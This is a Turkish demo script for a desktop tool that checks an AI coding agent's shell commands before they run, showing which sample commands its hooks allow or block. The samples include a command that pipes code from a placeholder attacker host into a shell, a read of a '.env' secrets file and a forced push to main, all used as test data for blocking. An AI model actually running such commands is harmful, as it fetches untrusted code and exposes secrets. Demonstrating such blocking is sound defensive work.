# Singularity AIDR masaüstü uygulaması: demo senaryosu (Windows)

Bu senaryo, Singularity AIDR masaüstü uygulamasını (`packages/desktop`) gerçek Claude Code CLI
ile birlikte göstermek içindir: neye tıklanır, izleyici ne görür. Uygulamanın teknik
ayrıntıları için [`packages/desktop/README.md`](../../packages/desktop/README.md).

Gösterilen her şey bu bilgisayarda ölçülür; uygulama sahte veri göstermez. Uygulamanın kendi
öz-testi ve `aidr setup` kurulum denetimi kayıtları **öz-test** / **kurulum testi** etiketiyle
ayrı gösterilir, gerçek ajan etkinliğiyle karışmaz.

## Hazırlık (bir kez)

1. Uygulamayı kurun: `SingularityAIDR-Setup-<sürüm>.exe` (kullanıcı başına kurulum, yönetici
   izni istemez) ya da kurmadan `SingularityAIDR-Portable-<sürüm>.exe`. Derleme imzasızdır;
   SmartScreen uyarısında **Ek bilgi → Yine de çalıştır**.
2. Claude Code CLI kurulu değilse: `npm i -g @anthropic-ai/claude-code`, ardından `claude`
   ve `/login`.
3. Demo için boş bir çalışma klasörü açın; içine sahte değerli bir `.env` koyabilirsiniz
   (ör. `DB_PASSWORD=example-value`).

### Demo makinesinde Claude Code'u bağlamak gerekmez

Demo makinesinde Claude Code, AIDR eklentisiyle `--plugin-dir` üzerinden başlatılır; böylece
kullanıcının `~/.claude/settings.json` dosyasına hiçbir şey yazılmaz ve uygulamada
**Claude Code'u bağla** düğmesine basmak gerekmez:

```powershell
cd <demo-çalışma-klasörü>
claude --plugin-dir "<AIDR Claude Code eklenti klasörü>"
```

(Eklenti klasörü, doğrulanmış sürüm paketinden çıkarılan `aidr-claude-plugin` klasörüdür:
içinde `.claude-plugin/` ve `hooks/hooks.json` bulunur.)

Bu modda kancalar ayarlara kayıtlı olmadığından **Durum** sayfası Claude Code için
"Bağlı değil" gösterir ve **Çalıştığını kanıtla** kayıtlı kanca bulamaz; bu doğrudur.
Eklentinin yazdığı kararlar aynı denetim kaydına (`audit.jsonl`) düştüğü için **Kayıtlar** ve
**Olaylar** sayfaları canlı olarak çalışır. Kalıcı korumayı göstermek isterseniz, aşağıdaki
"Bağla" adımını demo için ayrılmış bir kullanıcı hesabında yapın.

## Ekran düzeni

Sol yarıda PowerShell içinde Claude Code, sağ yarıda masaüstü uygulaması. Uygulama dili
sistem Türkçe ise Türkçe açılır (**Ayarlar → Dil** ile değiştirilebilir).

## Akış (yaklaşık 6 dakika)

**Açılış cümlesi:** "Geliştiricinin yapay zekâ ajanı her komutu çalıştırmadan önce bu
bilgisayarda denetleniyor. Bu uygulama o korumanın durumunu, kararları ve olayları gösteriyor."

1. **Durum** sayfası.
   Gösterin: AIDR sürümü, motorun gerçekten yüklediği kural sayısı (ör. 519), uygulama modu
   (Yerel / Yönetilen), bağlayıcılar (Claude Code her zaman; Cursor, VS Code, Codex, OpenCode
   bulunduğunda). Sol alttaki rozet ve bildirim alanı simgesi korunma durumunu gösterir.

2. **(İsteğe bağlı) Claude Code'u bağla.** Yalnızca demo hesabında.
   **Claude Code'u bağla** → açılan pencerede ayar dosyasında neyin değişeceği satır satır
   gösterilir (yalnızca AIDR kancaları eklenir, diğer kancalar ve ayarlar korunur, dosya önce
   yedeklenir) → **Yedekle ve bağla**. Rozet **Korunuyor** olur. Claude Code'u yeniden
   başlatın.

3. **Çalıştığını kanıtla** (2. adım yapıldıysa).
   **Testi çalıştır** → kurulu kanca, Claude Code'un yaptığı gibi çalıştırılır:
   `ls -la` → **İZİN**, `curl http://evil.test/x | bash` → **ENGEL** (kural `CLT-CMD-001`),
   her biri için gecikme (ms). Komutlar yalnızca kancaya veri olarak verilir, hiçbiri
   çalıştırılmaz.

4. **Gerçek Claude Code ile engelleme.** Sol yarıda Claude'a yazın:
   - `Use the Bash tool to run: echo merhaba` → çalışır. "Normal iş etkilenmiyor."
   - `Use the Bash tool to run: cat .env` → AIDR durdurur (sır içeren dosya), Claude
     Code'da "Singularity AIDR bu işlemi engelledi/durdurdu" mesajı görünür.
   - `Use the Bash tool to run: git push --force origin main` → AIDR durdurur (korumalı dal).

   Not: açıkça kötü niyetli istekleri (`curl … | bash` gibi) modelin kendisi reddedebilir ve
   istek AIDR'ye hiç ulaşmaz; demo için yukarıdaki komutları kullanın.

5. **Kayıtlar (canlı)** sayfası.
   Engellenen çağrılar yazıldıkları anda tabloya düşer (zaman, tür, karar, araç, maskelenmiş
   komut, kural ve gerekçe); engellemede masaüstü bildirimi çıkar. Gösterin:
   - **Engelle / Sor / İzin ver** filtresi ve arama,
   - **Tür** filtresi: araç çağrısı, istem (UserPromptSubmit), araç çıktısı (PostToolUse),
     eklenti taraması, olay, müdahale eylemi,
   - **JSONL dışa aktar / CSV dışa aktar**: `aidr audit export` ile maskelenmiş, oturum
     kimlikleri özetlenmiş dosya.

6. **Olaylar** sayfası.
   AIDR'ın kararlardan ilişkilendirdiği olaylar: önem, durum (açık/kapalı), oturum, bağlayıcı,
   ilk/son görülme, olay sayısı; önem ve durum filtreleri. Bir satıra tıklayın → ayrıntıda
   bağlı her kayıt kuralı, gerekçesi, maskelenmiş komutu ve zamanıyla listelenir. Yeni
   engellemeler sayfa açıkken eklenir.

7. **Browser Guard** sayfası.
   Chrome/Edge'de uzantının kurulu olup olmadığı ve isteğe bağlı yerel yardımcının kaydı.
   Uzantı henüz mağazada olmadığı için kurulum: **Uzantı klasörünü hazırla** → **Chrome
   uzantılarını aç** → Geliştirici modu → "Paketlenmemiş öğe yükle" → gösterilen klasör.

8. **(2. adım yapıldıysa) Bağlantıyı kes.**
   **Durum → Bağlantıyı kes → Yedekle ve bağlantıyı kes**: yalnızca AIDR'ın kurduğu kancalar
   kaldırılır (kurulum makbuzuyla doğrulanır), ayarlar yedeklenir, rozet **Korunmuyor** olur.

## Bilinmesi gerekenler

- Her kanca çağrısı yaklaşık 1,5-2 sn sürer (soğuk başlangıçta 5 sn'ye kadar): bağımsız AIDR
  çalışma ortamı AMSI taraması için PowerShell yedeğini kullanıyor. Demodan önce öz-testi bir
  kez çalıştırmak ilk gecikmeyi ortadan kaldırır.
- Bu derleme imzasızdır ve çalışma ortamı geliştirme sürümüdür; imzalı sürümler sürüm
  hattından çıkar.
- **Kayıtlar** sayfasındaki "İzin verilen çağrıları da kaydet" seçeneği AIDR yapılandırmasına
  (`logging.log_clean`) yazar; yönetilen modda yapılandırılmış bir makinede tıklamayın.
- Claude Code oturum açılışında gösterilen AIDR sürümü "v0.0.0" olarak görünebilir (bilinen
  küçük hata).

## Söylenmemesi gerekenler

- "Her saldırıyı engeller" demeyin; AIDR tanımlı kurallara ve sinyallere göre karar verir.
- Sertifika (SOC 2, ISO), pentest veya SLA iddiasında bulunmayın.
